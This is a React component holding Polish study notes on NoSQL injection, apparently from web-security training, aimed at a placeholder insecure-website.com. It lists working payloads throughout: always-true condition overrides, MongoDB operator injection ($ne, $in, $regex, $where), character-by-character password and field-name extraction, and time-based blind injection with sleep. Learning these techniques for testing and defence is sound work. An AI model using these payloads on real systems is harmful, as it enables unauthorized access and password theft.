import { useState } from "react";

const NoSql = () =>{
    return(
        <section>
            <h1>No Sql</h1>

            <details>
                <summary>Sprawdzanie dostępnych znaków</summary>
                <div className="waring">
                    <p>Próby złamana query poprzez wstrzyknięcie <span className="important">{`'`}</span> lub <span className="important">{`/'`}</span></p>
                    <p><u>Sprawdzanie zachowań warunków <span className="important">' && 0 && 'x</span> (https://insecure-website.com/product/lookup?category=fizzy<span className="important">'+%26%26+0+%26%26+'x</span>) oraz <span className="important">' && 1 && 'x</span> (https://insecure-website.com/product/lookup?category=fizzy<span className="important">'+%26%26+1+%26%26+'x</span>)</u></p>
                    <p>Nadpisanie warunku <span className="important">'||'1'=='1</span> (https://insecure-website.com/product/lookup?category=fizzy<span className="important">%27%7c%7c%27%31%27%3d%3d%27%31</span>) - zwraca wszystkie rekody z bazy (<u>UWAGA!!1 NIE UŻYWAĆ W MIEJSACH USUWANIA ELEMENTÓW BO ZROBI DROPA!!!!!</u>)</p>
                </div>
            </details>

            <hr />

            <details>
                <summary>Wstrzyknięcie operatora</summary>
                <div className="waring">
                    <p><span className="important">$where</span></p>
                    <p><span className="important">$ne</span> - not equal - {`{"username":{"$ne":"invalid"}}`} / {`username[$ne]=invalid`}</p>
                    <p><span className="important">$in</span> - in array - {`{"username":{"$in":["admin","administrator","superadmin"]}`}</p>
                    <p><span className="important">$regex</span> - {`{"$regex":"admin.*"}`}</p>
                </div>

                <br />

                <div className="waring">
                    <p>{`{"username":"wiener","password":"peter"}`}</p>

                    <br />

                    <p>{`{"username":"wiener","password":"peter", `}<span className="important">"$where":"0"</span>}</p>
                    <p>{`{"username":"wiener","password":"peter", `}<span className="important">"$where":"1"</span>}</p>
                    <p>Należy zwrócić uwagę na różnicę w response, jeżeli przez to zidentyfikujemy true i false, możemy kontynuować </p>
                    <p><span className="important">{`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`}</span></p>
                    <p><u>Dzieki poprzedniemu response wiemy kiedy wartość jest poprawne by odkryć kolumny ([0] index kolumny, {0} znak)</u></p>
                </div>
            </details>

            <hr />

            <details>
                <summary>Eksfiltracja danych</summary>
                <div className="waring">
                    <p>https://insecure-website.com/user/lookup?username=admin</p>
                    <p>{`{"$where":"this.username == 'admin'"}`}</p>
                    <p>więc</p>
                    <br />

                    <p><span className="important">{`' && this.password[0] == 'a' || 'a'=='b`}</span></p>
                    <p>Sprawdza czy pierwsza litera hasła to 'a'</p>
                    
                    <br />

                    <p><span className="important">{`' && this.password.match(/\d/) || 'a'=='b`}</span></p>
                    <p>To samo jako regex</p>
                </div>
            </details>

            <hr />

            <details>
                <summary>Identyfikacja nazw pól</summary>
                <div className="waring">
                    <p>https://insecure-website.com/user/lookup?username=admin</p>

                    <br />
                    <p><span className="important">' && this.username!=' </span></p>
                    <p>Zwróci true jeżeli istnieją pola username w przeciwnym razie będzie błąd</p>

                    <p><span className="important">' && this.foo!=' </span></p>
                    <p>Zwróci true jeżeli istnieją pola foo w przeciwnym razie będzie błąd</p>

                    <br />
                    <p>https://insecure-website.com/user/lookup?username=admin<span className="important">'+%26%26+this.password!%3d'</span></p>
                </div>
            </details>

            <hr />

            <details>
                <summary>Wstrzyknięcie opierającie się na czasie</summary>
                <div className="waring">
                    <p>Podobnie jak w przypadku wstrzyknięcia operatora z tym że jeżeli odpowiedź jest true usypiamy by respons przyszedł z opóźnieniem</p>
                    <p><span className="important">{`{"$where": "sleep(5000)"}`}</span></p>

                    <br />

                    <p>Lub w url</p>

                    <br />

                    <p><span className="important">{`'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`}</span></p>
                </div>
            </details>


        </section>
    )
}

export default NoSql;